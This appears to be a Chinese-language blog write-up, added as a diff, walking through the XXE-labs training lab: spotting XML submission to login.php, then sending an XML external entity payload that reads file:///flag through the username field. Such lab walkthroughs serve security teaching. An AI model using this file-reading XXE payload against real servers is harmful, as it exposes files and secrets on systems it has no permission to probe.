@@ -1,0 +1,69 @@
+<h1 id="XXE-labs"><a href="#XXE-labs" class="headerlink" title="XXE-labs"></a>XXE-labs</h1><blockquote>
+<p>我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出</p>
+</blockquote>
+<p><img src="/assets/image-20250422222903-k9ji6kx.png" alt="image">​</p>
+<blockquote>
+<p>同时 F12 进行前端查看 发现 在提交按钮处有</p>
+<p>​<code>&lt;button id=&quot;go&quot; onclick=&quot;XMLFunction()&quot;&gt;GO!&lt;/button&gt;</code>​</p>
+</blockquote>
+<p>&#x3D;&#x3D;说明我们的 数据传输方式为 xml&#x3D;&#x3D;<br> 当然，我们也可以直接 在burp suite 进行抓包查看</p>
+<p><img src="/assets/image-20250422223115-kr6nf3v.png" alt="image">​</p>
+<blockquote>
+<p>我们看到了 xml 文档声明：</p>
+<p>​<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>​</p>
+</blockquote>
+<p>所以，可能存在 xxe 漏洞</p>
+<p> 我们构造payload</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;
+]&gt;
+&lt;root&gt;
+&lt;username&gt;&amp;admin;&lt;/username&gt;
+&lt;password&gt;2333&lt;/password&gt;
+&lt;/root&gt;
+</code></pre>
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过引用定义在外部的 DTD 中的实体，我们称之为外部实体) 来访问我们 的 flag<br>有人可能会问 flag 也不会是 dtd 文件啊<br>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件<br>造成漏洞，这就是xxe</p>
+</blockquote>
+<p>所以到了这个时候，我们也就能够明白我们上面构造的payload的含义了：</p>
+<pre><code class="language-xml">&lt;username&gt;&amp;admin;&lt;/username&gt;    &lt;!--使用admin实体--&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;
+]&gt;                        &lt;!--声明admin实体--&gt;
+</code></pre>
+<p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入</p>
+<p> 点击 go 发现 flag</p>
+<p><img src="/assets/40ff3cea6e98dbb09db72be6393d5d29-20250422223739-segc056.png" alt="40ff3cea6e98dbb09db72be6393d5d29"></p>
+<p>当然在这里我们也可以 使用 postman （本质是一样的，都是传递参数 将我们的payload传递到后台 php）</p>
+<p> 我们查看源代码，发现是 post 传参</p>
+<pre><code class="language-js">&lt;script type=&quot;text/javascript&quot;&gt;
+        function XMLFunction(){
+            var xml = &#39;&#39; +
+                &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39; +
+            &#39;&lt;root&gt;&#39; +
+            &#39; &lt;username&gt;&#39; + $(&#39;#username&#39;).val() + &#39;&lt;/username&gt;&#39; +
+            &#39; &lt;password&gt;&#39; + $(&#39;#password&#39;).val() + &#39;&lt;/password&gt;&#39; +
+            &#39; &lt;/root&gt;&#39;; &lt;!--转化数据格式   串行格式化数据--&gt;
+            var xmlhttp = new XMLHttpRequest();   &lt;!--实例化XMLHttpRequest 对象--&gt;
+            xmlhttp.onreadystatechange = function () { &lt;!--页面初始化--&gt;
+                if(xmlhttp.readyState == 4){ &lt;!--实时跟踪异步响应状态，监听函数 readyState4 数据接收完毕  此时可以获取完整的响应数据--&gt;
+                    console.log(xmlhttp.readyState);
+                    console.log(xmlhttp.responseText);  &lt;!--接受数据--&gt;
+                    alert(xmlhttp.responseText);&lt;!--弹窗 接受数据--&gt;
+
+                }
+            }  
+            xmlhttp.open(&quot;POST&quot;,&quot;login.php&quot;,true); &lt;!---建立 post请求，要求异步响应   xhr.open(&quot;POST&quot;, url, false)--&gt;
+            xmlhttp.send(xml);  &lt;!--发送请求--&gt;
+        };
+    &lt;/script&gt;
+</code></pre>
+<p>上面有两点值得我们注意：</p>
+<ol>
+<li>是 post 传参</li>
+<li>接受地址是 login.php</li>
+</ol>
+<p> 现在我们使用 postman 了</p>
+<p><img src="/assets/454b83cf5da1b573bd3c3081543785ab-20250422223813-1wlcleh.png" alt="454b83cf5da1b573bd3c3081543785ab">​</p>
+<p>‍</p>
